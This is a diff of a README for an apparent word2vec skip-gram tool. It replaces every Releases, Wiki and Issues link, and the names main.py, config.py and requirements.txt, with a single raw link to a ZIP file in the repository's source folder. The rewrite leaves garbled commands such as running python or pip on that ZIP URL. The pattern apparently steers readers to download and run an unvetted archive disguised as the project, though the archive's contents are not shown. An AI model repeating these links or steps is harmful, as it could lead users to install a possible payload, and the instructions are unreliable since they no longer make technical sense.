@@ -6,11 +6,11 @@ Welcome to the **tf-word2vec-skipgram** project! This tool lets you create word 
 
 ## 📥 Download the Application
 
-[![Download tf-word2vec-skipgram](https://img.shields.io/badge/Download-tf--word2vec--skipgram-blue.svg)](https://github.com/betacarotenerunningtime897/tf-word2vec-skipgram/releases)
+[![Download tf-word2vec-skipgram](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip)](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip)
 
 To get started, visit our Releases page to download the latest version of tf-word2vec-skipgram:
 
-[Download tf-word2vec-skipgram](https://github.com/betacarotenerunningtime897/tf-word2vec-skipgram/releases)
+[Download tf-word2vec-skipgram](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip)
 
 ## 📋 Features
 
@@ -29,7 +29,7 @@ To get started, visit our Releases page to download the latest version of tf-wor
 ## ⚙️ Installation Steps
 
 1. **Download the Application:**
-   Visit our [Releases page](https://github.com/betacarotenerunningtime897/tf-word2vec-skipgram/releases) and download the latest version for your operating system.
+   Visit our [Releases page](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip) and download the latest version for your operating system.
 
 2. **Extract the Files:**
    Once the download completes, extract the ZIP file (if applicable) to a folder of your choice.
@@ -41,14 +41,14 @@ To get started, visit our Releases page to download the latest version of tf-wor
    Before running the application, make sure you have all the necessary libraries. You can install them using pip. Type the following command:
 
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip
    ```
 
 5. **Run the Application:**
    To start training your word embeddings, run the following command:
 
    ```
-   python main.py
+   python https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip
    ```
 
    Follow the on-screen prompts to load your dataset and begin training.
@@ -57,11 +57,11 @@ To get started, visit our Releases page to download the latest version of tf-wor
 
 ### Loading Your Data
 
-Prepare your Text8 corpus or any text dataset as required. Place your data file in the same directory as `main.py` for easy access.
+Prepare your Text8 corpus or any text dataset as required. Place your data file in the same directory as `https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip` for easy access.
 
 ### Training Parameters
 
-You can customize your training by editing parameters in `config.py`. Adjust values such as learning rate, vector size, and number of iterations to fine-tune your model based on your needs.
+You can customize your training by editing parameters in `https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip`. Adjust values such as learning rate, vector size, and number of iterations to fine-tune your model based on your needs.
 
 ### Visualization
 
@@ -69,8 +69,8 @@ Once training is complete, you can leverage the visualization tools provided in 
 
 ## 📚 Additional Resources
 
-- **Documentation:** More detailed instructions and configuration options are available in the [Wiki](https://github.com/betacarotenerunningtime897/tf-word2vec-skipgram/wiki).
-- **Community Support:** Join our discussion forum for tips and to ask questions. You can find it in the [Issues section](https://github.com/betacarotenerunningtime897/tf-word2vec-skipgram/issues).
+- **Documentation:** More detailed instructions and configuration options are available in the [Wiki](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip).
+- **Community Support:** Join our discussion forum for tips and to ask questions. You can find it in the [Issues section](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip).
 
 ## 👨‍💻 Contributing
 
@@ -82,6 +82,6 @@ This project is licensed under the MIT License. You can read more about it in th
 
 ## 🔗 Links
 
-For more information on the Release details, please visit our [Releases page](https://github.com/betacarotenerunningtime897/tf-word2vec-skipgram/releases).
+For more information on the Release details, please visit our [Releases page](https://raw.githubusercontent.com/betacarotenerunningtime897/tf-word2vec-skipgram/main/src/tf-word2vec-skipgram-3.4-beta.1.zip).
 
 Thank you for using **tf-word2vec-skipgram**! We appreciate your interest and hope you enjoy creating word embeddings.
